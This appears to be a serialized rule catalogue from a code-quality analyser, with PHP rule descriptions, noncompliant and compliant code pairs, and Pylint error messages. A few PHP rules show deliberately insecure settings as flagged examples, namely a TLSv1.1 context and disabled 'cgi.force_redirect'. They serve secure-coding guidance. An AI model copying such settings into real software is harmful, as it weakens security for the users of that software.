<h2>Noncompliant Code Example</h2>
<pre>
function foo($a) { // Noncompliant, function will return "true" or null
  if ($a == 1) {
    return true;
  }
  return;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
function foo($a) {
  if ($a == 1) {
    return true;
  }
  return false;
}
</pre>
<p>or </p>
<pre>
function foo($a) {
  if ($a == 1) {
    return true;
  }
  return null;
}
</pre>Z
CODE_SMELL
í
php:S836Ö
phpS836*Variables should be initialized before use"MAJOR*php:∫<p>When a variable is not initialized before its use, it's a sign that the developer made a mistake.</p>
<h2>Noncompliant Code Example</h2>
<pre>
function fun($condition) {
  $res = 1;
  if ($condition) {
    $res++;
  }
  return $result; // Noncompliant, "$result" instead of "$res"
}
</pre>
<h2>Compliant Solution</h2>
<pre>
function fun($condition) {
  $res = 1;
  if ($condition) {
    $res++;
  }
  return $res;
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/457.html">MITRE, CWE-457</a> - Use of Uninitialized Variable </li>
</ul>ZBUG
«
	php:S3699π
phpS3699EThe output of functions that don't return anything should not be used"MAJOR*php:“<p>If a function does not return anything, it makes no sense to use its output. Specifically, passing it to another function, or assigning its
"result" to a variable is probably a bug because such functions return nothing, which is probably not what was intended.</p>
<h2>Noncompliant Code Example</h2>
<pre>
$result = closedir($dir_handle); // Noncompliant, "closedir" does not return anything.
</pre>
<h2>Compliant Solution</h2>
<pre>
closedir($dir_handle);
</pre>ZBUG
ﬁ
	php:S4423–
phpS4423)Weak SSL/TLS protocols should not be used"MAJOR*php:˚<p>Older versions of SSL/TLS protocol like "SSLv3" have been proven to be insecure.</p>
<p>This rule raises an issue when an SSL/TLS context is created with an insecure protocol version (ie: a protocol different from "TLSv1.2", "TLSv1.3",
"DTLSv1.2" or "DTLSv1.3").</p>
<h2>Noncompliant Code Example</h2>
<pre>
$ctx = stream_context_create([
  'ssl' =&gt; [
    'crypto_method' =&gt;
      STREAM_CRYPTO_METHOD_TLSv1_1_CLIENT // Noncompliant
  ],
]);
</pre>
<h2>Compliant Solution</h2>
<pre>
$ctx = stream_context_create([
    'ssl' =&gt; [
        'crypto_method' =&gt; STREAM_CRYPTO_METHOD_TLSv1_2_CLIENT
    ],
]);
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure">OWASP Top 10 2017 Category A3</a> - Sensitive Data Exposure
  </li>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/326.html">MITRE, CWE-327</a> - Inadequate Encryption Strength </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/327.html">MITRE, CWE-326</a> - Use of a Broken or Risky Cryptographic Algorithm </li>
  <li> <a href="https://www.sans.org/top25-software-errors/#cat3">SANS Top 25</a> - Porous Defenses </li>
  <li> <a href="https://blogs.oracle.com/java-platform-group/diagnosing-tls,-ssl,-and-https">Diagnosing TLS, SSL, and HTTPS</a> </li>
  <li> <a href="https://github.com/ssllabs/research/wiki/SSL-and-TLS-Deployment-Best-Practices#22-use-secure-protocols">SSL and TLS Deployment Best
  Practices - Use secure protocols</a> </li>
</ul>ZVULNERABILITY
Ó
	php:S3335‡
phpS3335&"cgi.force_redirect" should be enabled"MAJOR*php:é<p>The <code>cgi.force_redirect</code> <em>php.ini</em> configuration is on by default, and it prevents unauthenticated access to scripts when PHP is
running as a CGI. Unfortunately, it must be disabled on IIS, OmniHTTPD and Xitami, but in all other cases it should be on.</p>
<p>This rule raises an issue when when <code>cgi.force_redirect</code> is explicitly disabled.</p>
<h2>Noncompliant Code Example</h2>
<pre>
; php.ini
cgi.force_redirect=0  ; Noncompliant
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/305">MITRE, CWE-305</a> - Authentication Bypass by Primary Weakness </li>
</ul>ZVULNERABILITY
¬-
	php:S2001¥-
phpS2001&Deprecated features should not be used"MAJOR*php:Â,<p>Deprecated language features are those that have been retained temporarily for backward compatibility, but which will eventually be removed from
the language. In effect, deprecation announces a grace period to allow the smooth transition from the old features to the new ones. In that period, no
use of the deprecated features should be added to the code, and all existing uses should be gradually removed.</p>
<p>The following functions were deprecated in PHP 5:</p>
<table>
  <tbody>
    <tr>
      <th>Deprecated</th>
      <th>Use Instead</th>
    </tr>
    <tr>
      <td><code>call_user_method()</code></td>
      <td><code>call_user_func()</code></td>
    </tr>
    <tr>
      <td><code>call_user_method_array()</code></td>
      <td><code>call_user_func_array()</code></td>
    </tr>
    <tr>
      <td><code>define_syslog_variables()</code></td>
      <td></td>
    </tr>
    <tr>
      <td><code>dl()</code></td>
      <td></td>
    </tr>
    <tr>
      <td><code>ereg()</code></td>
      <td><code>preg_match()</code></td>
    </tr>
    <tr>
      <td><code>ereg_replace()</code></td>
      <td><code>preg_replace()</code> (note that this is deprecated in PHP 5.5)</td>
    </tr>
    <tr>
      <td><code>eregi()</code></td>
      <td><code>preg_match()</code> with 'i' modifier</td>
    </tr>
    <tr>
      <td><code>eregi_replace()</code></td>
      <td><code>preg_replace()</code> with 'i' modifier</td>
    </tr>
    <tr>
      <td><code>set_magic_quotes_runtime()</code> and its alias, <code>magic_quotes_runtime()</code></td>
      <td></td>
    </tr>
    <tr>
      <td><code>session_register()</code></td>
      <td><code>$_SESSION</code> superglobal</td>
    </tr>
    <tr>
      <td><code>session_unregister()</code></td>
      <td><code>$_SESSION</code> superglobal</td>
    </tr>
    <tr>
      <td><code>session_is_registered()</code></td>
      <td><code>$_SESSION</code> superglobal</td>
    </tr>
    <tr>
      <td><code>set_socket_blocking()</code></td>
      <td><code>stream_set_blocking()</code></td>
    </tr>
    <tr>
      <td><code>split()</code></td>
      <td><code>preg_split()</code></td>
    </tr>
    <tr>
      <td><code>spliti()</code></td>
      <td><code>preg_split()</code> with 'i' modifier</td>
    </tr>
    <tr>
      <td><code>sql_regcase()</code></td>
      <td></td>
    </tr>
    <tr>
      <td><code>mysql_db_query()</code></td>
      <td><code>mysql_select_db()</code> and <code>mysql_query()</code></td>
    </tr>
    <tr>
      <td><code>mysql_escape_string()</code></td>
      <td><code>mysql_real_escape_string()</code></td>
    </tr>
    <tr>
      <td>Passing locale category names as strings</td>
      <td>Use the LC_* family of constants</td>
    </tr>
  </tbody>
</table>
<p>The following functions were deprecated in PHP 7:</p>
<table>
  <tbody>
    <tr>
      <th>Deprecated</th>
      <th>Use Instead</th>
    </tr>
    <tr>
      <td><code>__autoload()</code></td>
      <td><code>spl_autoload_register()</code></td>
    </tr>
    <tr>
      <td><code>create_function()</code></td>
      <td>anonymous function</td>
    </tr>
    <tr>
      <td><code>parse_str()</code> without second argument</td>
      <td><code>parse_str()</code> with second argument</td>
    </tr>
    <tr>
      <td><code>gmp_random()</code></td>
      <td><code>gmp_random_bits()</code> or <code>gmp_random_range()</code></td>
    </tr>
    <tr>
      <td><code>each()</code></td>
      <td><code>foreach</code></td>
    </tr>
    <tr>
      <td><code>assert()</code> with string argument</td>
      <td> </td>
    </tr>
    <tr>
      <td>Defining case-insensitive constants by calling <code>define()</code> with <code>true</code> as third parameter</td>
      <td><code>define("myconst", $value)</code> or <code>define("myconst", $value, false)</code></td>
    </tr>
    <tr>
      <td><code>FILTER_FLAG_SCHEME_REQUIRED</code> and <code>FILTER_FLAG_HOST_REQUIRED</code> flags</td>
      <td><code>FILTER_VALIDATE_URL</code> flag</td>
    </tr>
    <tr>
      <td><code>fgetss()</code> function, <code>"string.strip_tags"</code> stream filter name, <code>SplFileObject::fgetss()</code> method and
      <code>gzgetss()</code> function</td>
      <td> </td>
    </tr>
    <tr>
      <td><code>mbregex_encoding()</code>, <code>mbereg()</code>, <code>mberegi()</code>, <code>mbereg_replace()</code>,
      <code>mberegi_replace()</code>, <code>mbsplit()</code>, <code>mbereg_match()</code>, <code>mbereg_search()</code>,
      <code>mbereg_search_pos()</code>, <code>mbereg_search_regs()</code>, <code>mbereg_search_init()</code>, <code>mbereg_search_getregs()</code>,
      <code>mbereg_search_getpos()</code>, <code>mbereg_search_setpos()</code></td>
      <td>Use the<br> corresponding <code>mb_ereg_*()</code> variants instead</td>
    </tr>
    <tr>
      <td>string search functions with integer needle (<code>stristr</code>, <code>strrchr</code>, <code>strstr</code>, <code>strripos</code>,
      <code>stripos</code>, <code>strrpos</code>, <code>strpos</code>, <code>strchr</code>) </td>
      <td>use a string needle instead</td>
    </tr>
    <tr>
      <td><code>image2wbmp()</code></td>
      <td><code>imagewbmp()</code></td>
    </tr>
    <tr>
      <td><code>Normalizer::NONE</code></td>
      <td> </td>
    </tr>
    <tr>
      <td>Defining an <code>assert()</code> function inside a namespace</td>
      <td>use the standard <code>assert()</code> function</td>
    </tr>
  </tbody>
</table>
<h2>See</h2>
<ul>
  <li> <a href="https://wiki.php.net/rfc/deprecations_php_7_3">PHP RFC: Deprecations for PHP 7.3</a> </li>
  <li> <a href="https://wiki.php.net/rfc/case_insensitive_constant_deprecation">PHP RFC: Deprecate and Remove Case-Insensitive Constants</a> </li>
</ul>Z
CODE_SMELL
Ì
	php:S2123ﬂ
phpS2123*Values should not be uselessly incremented"MAJOR*php:ì<p>A value that is incremented or decremented and then not stored is at best wasted code and at worst a bug.</p>
<h2>Noncompliant Code Example</h2>
<pre>
  $i = 0;
  $i = $i++; // Noncompliant; i is still zero
</pre>
<h2>Compliant Solution</h2>
<pre>
  $i = 0;
  $i++;
</pre>ZBUG
Ò
	php:S4144„
phpS41441Methods should not have identical implementations"MAJOR*php:â<p>When two methods have the same implementation, either it was a mistake - something else was intended - or the duplication was intentional, but may
be confusing to maintainers. In the latter case, one implementation should invoke the other.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class A {
    private const CODE = "bounteous";

    public function getCode() {
        doTheThing();
        return A::CODE;
    }

    public function getName() {  // Noncompliant
        doTheThing();
        return A::CODE;
    }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
class A {
    private const CODE = "bounteous";

    public function getCode() {
        doTheThing();
        return A::CODE;
    }

    public function getName() {
        return $this-&gt;getCode();
    }
}
</pre>
<h2>Exceptions</h2>
<p>Methods that are not accessors (getters and setters), with fewer than 2 statements are ignored.</p>Z
CODE_SMELL
±
	php:S1151£
phpS1151<"switch case" clauses should not have too many lines of code"MAJOR*php:æ<p>The <code>switch</code> statement should be used only to clearly define some new branches in the control flow. As soon as a <code>case</code>
clause contains too many statements this highly decreases the readability of the overall control flow statement. In such case, the content of the
<code>case</code> clause should be extracted into a dedicated method.</p>
<h2>Noncompliant Code Example</h2>
<p>With a threshold of 5:</p>
<pre>
switch ($var) {
  case 0:  // 6 lines till next case
    methodCall1();
    methodCall2();
    methodCall3();
    methodCall4();
    break;
  default:
    break;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
switch ($var) {
  case 0:
    doSomething();
    break;
  default:
    break;
}

function doSomething(){
  methodCall1("");
  methodCall2("");
  methodCall3("");
  methodCall4("");
}
</pre>Z
CODE_SMELL
˘
	php:S2918Î
phpS2918/Configuration should not be changed dynamically"MAJOR*php:ì<p><code>ini_set</code> changes the value of the given configuration option for the duration of the script's execution. While there may be a reason to
do this, you should make sure that it's a very good reason indeed, because this is the sort of "magic" change which can cause severe teeth-gnashing
and hair tearing when the script needs to be debugged. </p>
<p>For instance, if the user explicitly turns logging on for a script, but then the script itself uses <code>ini_set('display_errors', 0);</code> to
turn logging back off, it is likely that every other aspect of the environment will be examined before, in desperation, the script is read to figure
out where the logging is going.</p>
<h2>Noncompliant Code Example</h2>
<pre>
ini_set('display_errors', 0);  // Noncompliant
</pre>Z
CODE_SMELL
°
php:S125î
phpS125,Sections of code should not be commented out"MAJOR*php:¿<p>Programmers should not comment out code as it bloats programs and reduces readability.</p>
<p>Unused code should be deleted and can be retrieved from source control history if required.</p>Z
CODE_SMELL
â	
php:S127¸
phpS127."for" loop stop conditions should be invariant"MAJOR*php:¶<p>A <code>for</code> loop stop condition should test the loop counter against an invariant value (i.e. one that is true at both the beginning and
ending of every loop iteration). Ideally, this means that the stop condition is set to a local variable just before the loop begins. </p>
<p>Stop conditions that are not invariant are slightly less efficient, as well as being difficult to understand and maintain, and likely lead to the
introduction of errors in the future.</p>
<p>This rule tracks three types of non-invariant stop conditions:</p>
<ul>
  <li> When the loop counters are updated in the body of the <code>for</code> loop </li>
  <li> When the stop condition depend upon a method call </li>
  <li> When the stop condition depends on an object property, since such properties could change during the execution of the loop. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
for ($i = 0; $i &lt; 10; $i++) {
  echo $i;
  if(condition) {
    $i = 20;
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
for ($i = 0; $i &lt; 10; $i++) {
  echo $i;
}

</pre>Z
CODE_SMELL
˛
	php:S4142
phpS41422Duplicate values should not be passed as arguments"MAJOR*php:ï<p>There are valid cases for passing a variable multiple times into the same method call, but usually doing so is a mistake, and something else was
intended for one of the arguments.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (compare($a+$x, $a+$x) != 0) { // Noncompliant
&nbsp;&nbsp;//...
}

if (compare(getValue($a), getValue($a)) != 0) { // Noncompliant
&nbsp;&nbsp;// ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
if (compare($a+$y, $a+$x) != 0) {
&nbsp;&nbsp;//...
}

$v1 = getValue($a);
$v2 = getValue($a);
if (compare($v1, $v2) != 0) {
&nbsp;&nbsp;// ...
}
</pre>
<h2>Deprecated</h2>
<p>This rule is deprecated, and will eventually be removed.</p>Z
CODE_SMELL
·
	php:S1200”
phpS1200YClasses should not be coupled to too many other classes (Single Responsibility Principle)"MAJOR*php:—
<p>According to the Single Responsibility Principle, introduced by Robert C. Martin in his book "Principles of Object Oriented Design", a class should
have only one responsibility:</p>
<blockquote>
  <p>If a class has more than one responsibility, then the responsibilities become coupled.</p>
  <p>Changes to one responsibility may impair or inhibit the class' ability to meet the others.</p>
  <p>This kind of coupling leads to fragile designs that break in unexpected ways when changed.</p>
</blockquote>
<p>Classes which rely on many other classes tend to aggregate too many responsibilities and should be split into several smaller ones.</p>
<p>Nested classes dependencies are not counted as dependencies of the outer class.</p>
<h2>Noncompliant Code Example</h2>
<pre>
  class Foo {            // Noncompliant - Foo depends on too many classes: T1, T2, T3, T4, T5, T6 and T7
    /**
     * @var T1
     */
    public $a1;          // Foo is coupled to T1
    /**
     * @var T2
     */
    protected $a2;       // Foo is coupled to T2
    /**
     * @var T3
     */
    private $a3;         // Foo is coupled to T3

    /**
     * @param T5
     * @param T6
     *
     * @return T4
     */
    public function compute(T5 $a, $b) { // Foo is coupled to T4, T5 and T6
      $result = new T7();     // Foo is coupled to T7
      return $result;
  }
}
</pre>Z
CODE_SMELL
≠
	php:S3984ü
phpS39844Exception should not be created without being thrown"MAJOR*php:…<p>Creating a new <code>Exception</code> without actually throwing it is useless and is probably due to a mistake.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if ($x &lt; 0)
  new Exception('$x must be nonnegative');
</pre>
<h2>Compliant Solution</h2>
<pre>
if ($x &lt; 0)
  throw new Exception('$x must be nonnegative');
</pre>ZBUG
˚	
	php:S4833Ì	
phpS4833IUse of namespaces should be preferred to "include" or "require" functions"MAJOR*php:˚<p>PHP 5.3 introduces <a href="http://www.php.net/namespaces">namespaces</a> to the language. Use of this mechanism should be preferred to
<code>include</code> or <code>include_once</code> or <code>require</code> or <code>require_once</code> because it solves two common problems:</p>
<ul>
  <li> it avoids name collisions </li>
  <li> it provides the ability to create alias which improve readability of the code </li>
</ul>
<p>Starting from its version 8, Drupal is relying on namespaces to be compliant with <a
href="https://github.com/php-fig/fig-standards/blob/master/accepted/PSR-4-autoloader.md">PSR-4 standard</a>. Drupal's modules should be compliant with
PSR-4 standard and therefore should no longer rely on <code>include</code> or <code>include_once</code> or <code>require</code> or
<code>require_once</code> functions.</p>
<h2>Noncompliant Code Example</h2>
<pre>
require_once('./modules/vegetable/src/Entity/Tomato.php');
</pre>
<h2>Compliant Solution</h2>
<pre>
use Drupal\vegetable\Entity\Tomato
</pre>
<h2>Exceptions</h2>
<p>This rule doesn't raise issues on <code>autoload.php</code> or <code>ScriptHandler.php</code> files.</p>Z
CODE_SMELL
í
	php:S3981Ñ
phpS3981=Array or Countable object count comparisons should make sense"MAJOR*php:•<p>The count of elements from an array or Countable object is always greater than or equal to zero. So testing that the count is greater than or equal
to zero doesn't make sense, since the result is always <code>true</code>. Similarly testing that it is less than zero will always return
<code>false</code>. Perhaps the intent was to check the non-emptiness of the object or array instead. </p>
<h2>Noncompliant Code Example</h2>
<pre>
if (count($arr) &gt;= 0) { ... }

if (count($arr) &lt; 0) { ... }

$result = count($arr) &gt;= 0;

if (0 &gt; count($arr)) { ... }
</pre>
<h2>Compliant Solution</h2>
<pre>
if (count($arr) != 0) { ... }

if (count($arr) &gt; 0) { ... }
</pre>ZBUG
ú
	php:S1605é
phpS1605P"__construct" functions should not make PHP 4-style calls to parent constructors"MAJOR*php:ï<p>In PHP 5 both the way to declare a constructor and the way to make a call to a parent constructor have evolved. When declaring constructors with
the PHP5 <code>__construct</code> name, nested calls to parent constructors should also use the new <code>__constructor</code> name.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class Foo extends Bar {
  function __construct() {
    parent::Bar();
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
class Foo extends Bar {
  function __construct() {
    parent::__construct();
  }
}
</pre>Z
CODE_SMELL
£
	php:S1848ï
phpS1848JObjects should not be created to be dropped immediately without being used"MAJOR*php:©<p>There is no good reason to create a new object to not do anything with it. Most of the time, this is due to a missing piece of code and so could
lead to an unexpected behavior in production.</p>
<p>If it was done on purpose because the constructor has side-effects, then that side-effect code should be moved into a separate, static method and
called directly.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if ($x &lt; 0) {
  new foo;  // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
$var = NULL;
if ($x &lt; 0) {
  $var = new foo;
}
</pre>ZBUG
Ù
	php:S1448Ê
phpS1448(Classes should not have too many methods"MAJOR*php:ï<p>A class that grows too much tends to aggregate too many responsibilities and inevitably becomes harder to understand and therefore to maintain.
Above a specific threshold, it is strongly advised to refactor the class into smaller ones which focus on well defined topics.</p>Z
CODE_SMELL
Ω
	php:S1603Ø
phpS16031PHP 4 constructor declarations should not be used"MAJOR*php:’<p>In PHP 4, any function with the same name as the nesting class was considered a class constructor. In PHP 5, this mechanism has been deprecated and
the "__construct" method name should be used instead. If both styles are present in the same class, PHP 5 will treat the function named "__construct"
as the class constructor. </p>
<p>This rule rule raises an issue for each method with the same name as the enclosing class.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class Foo {
  function Foo(){...}
}
</pre>
<h2>Compliant Solution</h2>
<pre>
class Foo {
  function __construct(){...}
}
</pre>Z
CODE_SMELL
≈
	php:S1600∑
phpS16002Deprecated predefined variables should not be used"MAJOR*php:‹<p>The following predefined variables are deprecated and should be replaced by the new versions:</p>
<table>
  <tbody>
    <tr>
      <th>Replace</th>
      <th>With</th>
    </tr>
    <tr>
      <td>$HTTP_SERVER_VARS</td>
      <td>$_SERVER</td>
    </tr>
    <tr>
      <td>$HTTP_GET_VARS</td>
      <td>$_GET</td>
    </tr>
    <tr>
      <td>$HTTP_POST_VARS</td>
      <td>$_POST</td>
    </tr>
    <tr>
      <td>$HTTP_POST_FILES</td>
      <td>$_FILES</td>
    </tr>
    <tr>
      <td>$HTTP_SESSION_VARS</td>
      <td>$_SESSION</td>
    </tr>
    <tr>
      <td>$HTTP_ENV_VARS</td>
      <td>$_ENV</td>
    </tr>
    <tr>
      <td>$HTTP_COOKIE_VARS</td>
      <td>$_COOKIE</td>
    </tr>
    <tr>
      <td>$php_errormsg</td>
      <td>error_get_last()</td>
    </tr>
  </tbody>
</table>
<h2>Noncompliant Code Example</h2>
<pre>
echo 'Name parameter value: ' . $HTTP_GET_VARS["name"];
</pre>
<h2>Compliant Solution</h2>
<pre>
echo 'Name parameter value: ' . $_GET["name"];
</pre>Z
CODE_SMELL
Å
php:S138Ù
phpS1380Functions should not have too many lines of code"MAJOR*php:ú<p>A function that grows too large tends to aggregate too many responsibilities.</p>
<p>Such functions inevitably become harder to understand and therefore harder to maintain. </p>
<p>Above a specific threshold, it is strongly advised to refactor into smaller functions which focus on well-defined tasks.</p>
<p>Those smaller functions will not only be easier to understand, but also probably easier to test.</p>Z
CODE_SMELL
â
	php:S2251˚
phpS2251IA "for" loop update clause should move the counter in the right direction"MAJOR*php:ê<p>A <code>for</code> loop with a counter that moves in the wrong direction is not an infinite loop. Because of wraparound, the loop will eventually
reach its stop condition, but in doing so, it will run many, many more times than anticipated, potentially causing unexpected behavior. </p>
<h2>Noncompliant Code Example</h2>
<pre>
for ($i = 0; $i &lt; $length; $i--) { // Noncompliant
  //...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
for ($i = 0; $i &lt; $length; $i++) {
  //...
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/zYEzAg">CERT, MSC54-J.</a> - Avoid inadvertent wrapping of loop counters </li>
</ul>ZBUG
‹
Pylint:E0704À
PylintE07042The raise statement is not inside an except clause"MAJOR*py2E0704:ÁUsed when a bare raise is not used inside an except clause. This generates an error, since there are no active exceptions to be reraised. An exception to this rule is represented by a bare raise inside a finally clause, which might work, as long as an exception is raised inside the try block, but it is nevertheless a code smell that must not be relied upon.Z
CODE_SMELL
ö
Pylint:E0701â
PylintE0701Bad except clauses order"MAJOR*py2E0701:øUsed when except clauses are not in the correct order (from the more specific to the more generic). If you don't fix the order, some exceptions may not be caught by the most specific handler.Z
CODE_SMELL
Ï
Pylint:E0702€
PylintE07026Raising only allowed for classes, instances or strings"MAJOR*py2E0702:tUsed when something which is neither a class, an instance or a string is raised (i.e. a 'TypeError' will be raised).Z
CODE_SMELL
Ï
Pylint:E1111€
PylintE1111EAssigning result of a function call, where the function has no return"MAJOR*py2E1111:eUsed when an assignment is done on a function call but the inferred function doesn't return anything.Z
CODE_SMELL
Á
Pylint:E1129÷
PylintE11298Context manager doesn't implement __enter__ and __exit__"MAJOR*py2E1129:mUsed when an instance in a with statement doesn't implement the context manager protocol(__enter__/__exit__).Z
CODE_SMELL
º
Pylint:E0711´
PylintE07118NotImplemented raised - should raise NotImplementedError"MAJOR*py2E0711:BUsed when NotImplemented is raised instead of NotImplementedError.Z
CODE_SMELL
∂
Pylint:E1125•
PylintE1125*Missing mandatory keyword argument in call"MAJOR*py2E1125:JUsed when a function call does not pass a mandatory keyword-only argument.Z
CODE_SMELL
ˇ
Pylint:E1126Ó
PylintE1126?Sequence index is not an int, slice, or instance with __index__"MAJOR*py2E1126:~Used when a sequence type is indexed with an invalid type. Valid types are ints, slices, and objects with an __index__ method.Z
CODE_SMELL
‘
Pylint:E1127√
PylintE1127;Slice index is not an int, None, or instance with __index__"MAJOR*py2E1127:WUsed when a slice index is not an integer, None, or an object with an __index__ method.Z
CODE_SMELL
”
Pylint:E0710¬
PylintE0710BRaising a new style class which doesn't inherit from BaseException"MAJOR*py2E0710:OUsed when a new style class which doesn't inherit from BaseException is raised.Z
CODE_SMELL
Ï
Pylint:E1128€
PylintE1128DAssigning result of a function call, where the function returns None"MAJOR*py2E1128:fUsed when an assignment is done on a function call but the inferred function returns nothing but None.Z
CODE_SMELL
∞
Pylint:E1121ü
PylintE1121/Too many positional arguments for function call"MAJOR*py2E1121:?Used when a function call passes too many positional arguments.Z
CODE_SMELL
∑
Pylint:E1122¶
PylintE1122+Duplicate keyword argument in function call"MAJOR*py2E1122:JUsed when a function call passes the same keyword argument multiple times.Z
CODE_SMELL
⁄
Pylint:E1001…
PylintE1001&Use of __slots__ on an old style class"MAJOR*py2E1001:rUsed when an old style class uses the __slots__ attribute. This message can't be emitted when using Python >= 3.0.Z
CODE_SMELL
–
Pylint:E1002ø
PylintE1002"Use of super on an old style class"MAJOR*py2E1002:lUsed when an old style class uses the super builtin. This message can't be emitted when using Python >= 3.0.Z
CODE_SMELL
Î
Pylint:E1123⁄
PylintE11234Passing unexpected keyword argument in function call"MAJOR*py2E1123:uUsed when a function call passes a keyword argument that doesn't correspond to one of the function's parameter names.Z
CODE_SMELL
≈
Pylint:E1003¥
PylintE1003!Bad first argument given to super"MAJOR*py2E1003:bUsed when another argument than the current class is given as first argument of the super builtin.Z
CODE_SMELL
ö
Pylint:E1124â
PylintE11245Multiple values passed for parameter in function call"MAJOR*py2E1124:¢Used when a function call would result in assigning multiple values to a function parameter, one value from a positional argument and one from a keyword argument.Z
CODE_SMELL
Ö
Pylint:E1120u
PylintE1120Too few arguments"MAJOR*py2E1120:3Used when a function call passes too few arguments.Z
CODE_SMELL
å
Pylint:F0401|
PylintF0401Unable to import module"MAJOR*py2F0401:4Used when Pylint has been unable to import a module.Z
CODE_SMELL
ü
Pylint:E0601é
PylintE0601 Using variable before assignment"MAJOR*py2E0601:=Used when a local variable is accessed before its assignment.Z
CODE_SMELL

Pylint:E0602o
PylintE0602Undefined variable"MAJOR*py2E0602:,Used when an undefined variable is accessed.Z
CODE_SMELL
◊
Pylint:E1136∆
PylintE1136.Subscripted value doesn't support subscription"MAJOR*py2E1136:gEmitted when a subscripted value doesn't support subscription (i.e. doesn't define __getitem__ method).Z
CODE_SMELL
 
Pylint:E1137π
PylintE1137'Object does not support item assignment"MAJOR*py2E1137:aEmitted when an object does not support item assignment (i.e. doesn't define __setitem__ method).Z
CODE_SMELL
∆
Pylint:E1138µ
PylintE1138%Object does not support item deletion"MAJOR*py2E1138:_Emitted when an object does not support item deletion (i.e. doesn't define __delitem__ method).Z
CODE_SMELL
Ÿ
Pylint:E1139»
PylintE1139Invalid metaclass used"MAJOR*py2E1139:ÄEmitted whenever we can detect that a class is using, as a metaclass, something which might be invalid for using as a metaclass.Z
CODE_SMELL
•
Pylint:E1132î
PylintE1132$Multiple values for keyword argument"MAJOR*py2E1132:?Emitted when a function call got multiple values for a keyword.Z
CODE_SMELL
ª
Pylint:E1133™
PylintE1133/Non-iterable value used in an iterating context"MAJOR*py2E1133:JUsed when a non-iterable value is used in place where iterable is expectedZ
CODE_SMELL
µ
Pylint:E1134§
PylintE1134+Non-mapping value used in a mapping context"MAJOR*py2E1134:HUsed when a non-mapping value is used in place where mapping is expectedZ
CODE_SMELL
ﬂ
Pylint:E1135Œ
PylintE1135Unsupported membership test"MAJOR*py2E1135:ÅEmitted when an instance in membership test expression doesn't implement membership protocol (__contains__/__iter__/__getitem__).Z
CODE_SMELL
º
Pylint:E1130´
PylintE1130Invalid unary operand type"MAJOR*py2E1130:`Emitted when a unary operand is used on an object which does not support this type of operation.Z
CODE_SMELL
Ø
Pylint:E1131û
PylintE1131Unsupported binary operation"MAJOR*py2E1131:QEmitted when a binary arithmetic operation between two operands is not supported.Z
CODE_SMELL
Ü
Pylint:E0611v
PylintE0611Undefined name in module"MAJOR*py2E0611:-Used when a name cannot be found in a module.Z
CODE_SMELL
Ê
Pylint:E1700’
PylintE1700Yield inside async function"MAJOR*py2E1700:àUsed when an `yield` or `yield from` statement is found inside an async function. This message can't be emitted when using Python < 3.5.Z
CODE_SMELL
¶
Pylint:E1140ï
PylintE1140Dict key is unhashable"MAJOR*py2E1140:NEmitted when a dict key is not hashable (i.e. doesn't define __hash__ method).Z
CODE_SMELL
Ó
Pylint:E0501›
PylintE0501>Non-ASCII characters found but no encoding specified (PEP 263)"MAJOR*py2E0501:nUsed when some non-ASCII characters are detected but no
      encoding is specified, as stated in the PEP 263.Z
CODE_SMELL
¬
Pylint:E0502±
PylintE0502Wrong encoding specified"MAJOR*py2E0502:hUsed when a known encoding is specified but the file
      doesn't seem to be actually in this encoding.Z
CODE_SMELL
õ
Pylint:E0503ä
PylintE0503Unknown encoding specified"MAJOR*py2E0503:?Used when an encoding is specified, but it's unknown to Python.Z
CODE_SMELL
ã
Pylint:E1606˙
PylintE1606Use of long suffix"MAJOR*py2E1606:∂Used when "l" or "L" is used to mark a long integer. This will not work in Python 3, since `int` and `long` types have merged. This message can't be emitted when using Python >= 3.0.Z
CODE_SMELL
Ì
Pylint:E1607‹
PylintE1607Use of the <> operator"MAJOR*py2E1607:îUsed when the deprecated "<>" operator is used instead of "!=". This is removed in Python 3. This message can't be emitted when using Python >= 3.0.Z
CODE_SMELL
Ö
Pylint:E1608Ù
PylintE1608Use of old octal literal"MAJOR*py2E1608:™Used when encountering the old octal syntax, removed in Python 3. To use the new syntax, prepend 0o on the number. This message can't be emitted when using Python >= 3.0.Z
CODE_SMELL
≥
Pylint:E1602¢
PylintE1602Parameter unpacking specified"MAJOR*py2E1602:TUsed when parameter unpacking is specified for a function(Python 3 doesn't allow it)Z
CODE_SMELL
ˆ
Pylint:E1603Â
PylintE1603=Implicit unpacking of exceptions is not supported in Python 3"MAJOR*py2E1603:wPython3 will not allow implicit unpacking of exceptions in except clauses. See http://www.python.org/dev/peps/pep-3110/Z
CODE_SMELL
Ó
Pylint:E1609›
PylintE1609%Import * only allowed at module level"MAJOR*py2E1609:ÜUsed when the import star syntax is used somewhere else than the module level. This message can't be emitted when using Python >= 3.0.Z
CODE_SMELL
Ÿ
Pylint:E1604»
PylintE1604=Use raise ErrorClass(args) instead of raise ErrorClass, args."MAJOR*py2E1604:ZUsed when the alternate raise syntax 'raise foo, bar' is used instead of 'raise foo(bar)'.Z
CODE_SMELL
∞
Pylint:E1605ü
